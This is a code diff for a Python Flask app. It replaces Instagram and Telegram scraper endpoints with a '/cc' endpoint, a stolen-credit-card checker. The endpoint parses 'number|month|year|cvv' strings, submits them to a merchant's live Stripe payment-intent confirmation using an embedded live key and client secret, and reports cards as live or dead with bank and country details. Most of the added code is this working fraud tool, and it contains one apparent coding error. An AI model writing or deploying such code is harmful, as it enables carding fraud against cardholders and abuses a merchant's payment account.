@@ -1,48 +1,65 @@
-from bs4 import BeautifulSoup
-import lxml,json,requests
-from flask import *
+import requests,flask
+
+from flask import Flask,request
 
 app = Flask(__name__)
-@app.route("/data/")
-def info():
-    userid = request.args.get("id")
-    URL = f"https://i.instagram.com/api/v1/users/{userid}/info"
-    headers = {'User-Agent':'Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743)'} 
-    response = requests.get(URL, headers=headers)
-    return (response.json()["user"])
-@app.route('/teleinfo/',methods=['GET'])
-def telegraminfograber_page():
 
-    search_query = str(request.args.get('url'))
-    try:
-        url = f'{search_query}?embed=1'
-        views_table = []
-        date_table = []
-        title_table = []
+@app.route("/cc")
+def s():
 
-        result = requests.get(f"{url}")
-        src = result.content
+    ccc = f"{request.get.args('c')}"
+    cc = ccc.split("|")[0]
+    m = ccc.split("|")[1]
+    y = ccc.split("|")[2]
+    cvv = ccc.split("|")[3]
 
-        soup = BeautifulSoup(src, "lxml")
+    url = "https://api.stripe.com/v1/payment_intents/pi_3LE5OgHKSiz0kTyd1jM4ah5X/confirm"
+    headers = {
+'authority': 'api.stripe.com',
+'method': 'POST',
+'path': '/v1/payment_intents/pi_3LE5OgHKSiz0kTyd1jM4ah5X/confirm h2',
+'scheme': 'https',
+'accept': 'application/json',
+'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
+'content-type': 'application/x-www-form-urlencoded',
+'origin': 'https://js.stripe.com',
+'referer': 'https://js.stripe.com/',
+'sec-fetch-dest': 'empty',
+'sec-fetch-mode': 'cors',
+'sec-fetch-site': 'same-site',
+'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.125 Mobile Safari/537.36',
+    }
+    data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=Trakos+Diaa&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={m}&payment_method_data[card][exp_year]={y}&payment_method_data[guid]=a95446a6-b75c-4429-bb68-7489e6957ab2f764dd&payment_method_data[muid]=cdf9bfe6-aab2-4c91-b4c7-2abf52a483ee3be400&payment_method_data[sid]=cb1d62e5-c28a-4d36-bfc0-550732abfc6bb4a5f1&payment_method_data[payment_user_agent]=stripe.js%2F988743ca6%3B+stripe-js-v3%2F988743ca6&payment_method_data[time_on_page]=104603&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_iHIxB7OJrLLocOUih5WWEfc3&client_secret=pi_3LE5OgHKSiz0kTyd1jM4ah5X_secret_63UzakccvPfNLxgdlaQiDhBVd'
+    r = requests.post(url,headers=headers,data=data)
+    print(r.json())
+    at = requests.get(f"https://lookup.binlist.net/{cc}").json()
+    brand = at['brand']
+    sc = at['scheme']
+    country = at['country']['name']
+    cem = at['country']['emoji']
+    bank = at['bank']['name']
+    if "success" in r.text or "Your card has insufficient funds." in r.text or "incorrect_zip" in r.text:
+        dat = {
+            "status":"success",
+            "response":f"{r.json()['card']['message']}",
+            "card":f"{ccc}",
+            "gate":"Stripe v1",
+            "country":f"{country} {cem}"
+        }
+        return dat
+    if "Your card does not support this type of purchase." in r.text or "Your card was declined." in r.text or "Your card has expired." in r.text or "The card number is incorrect." in r.text or "do_not_honor" in r.text:
+        dat = {
+            "status":"error",
+            "response":f"{r.json()['card']['message']}",
+            "card":f"{ccc}",
+            "gate":"Stripe v1",
+            "country":f"{country} {cem}"
+        }
+        return dat
+    else:
+        dat = {
+            "status":"error",
+        }
+        return dat
 
-        views = soup.find_all("span", {"class": "tgme_widget_message_views"})
-        g = str(views[0]).replace('</span>','').replace('<span class="tgme_widget_message_views">','')
-
-        title = soup.find_all("div", {"class": "tgme_widget_message_text js-message_text"})
-        for i in range(len(title)):
-            title_table.append(title[i].text)
-
-        date = soup.find_all("time")
-        for i in range(len(date)):
-            date_table.append(date[i].text)
-
-        data_set = {'date': f'{date_table[0]}', 'msg': f'{title_table[0]}', 'views': f'{g}', 'stats': f'Loaded'}
-        json_string = json.dumps(data_set, ensure_ascii=False)
-        response = Response(json_string, content_type="application/json; charset=utf-8")
-        return response
-    except:
-        data_set = {'stats': f'Error!'}
-        return data_set
-    
-if __name__ == "__main__":
-    app.run()
+app.run(host="0.0.0.0",port=8080)
